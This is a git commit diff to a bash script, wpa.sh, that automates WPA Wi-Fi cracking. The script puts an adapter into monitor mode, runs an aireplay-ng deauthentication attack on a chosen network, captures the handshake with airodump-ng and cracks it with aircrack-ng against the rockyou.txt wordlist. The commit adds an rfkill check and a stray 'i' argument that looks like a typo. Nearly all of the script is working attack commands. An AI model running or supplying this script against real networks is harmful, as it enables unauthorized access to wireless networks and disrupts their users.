20911c8756ca3d8ca56512d679d9d49774df7ed0
prote <prote@prote.168.1.28>
2023-03-20 12:38:16 +0200

    added rf kill seems that it blocks accessing adpters

--- wpa.sh
+++ wpa.sh
@@ -1,6 +1,7 @@
 #!/bin/bash
 sudo rm -rf wpacap-01*
 read -p "Please enter your wireless adapter interface name (use iwconfig):" wlan
+sudo rfkill list all
 sudo ifconfig $wlan down
 sudo iwconfig $wlan mode monitor
 sudo ifconfig $wlan up
@@ -9,7 +10,7 @@ read -p "Please choose a WPA encrypted network bssid/mac from above:" NetMac
 read -p "please specify channel of network:" c
 sudo iwconfig $wlan channel $c
 sudo aireplay-ng --deauth 25 -a $NetMac $wlan &
-sudo sudo timeout 20s airodump-ng --bssid $NetMac --channel $c $wlan --write wpacap &
+sudo sudo timeout 20s airodump-ng --bssid $NetMac --channel $c $wlan --write wpacap i &
 wait
 sudo aircrack-ng wpacap-01.cap -w rockyou.txt
 sudo rm -rf wpacap-01*
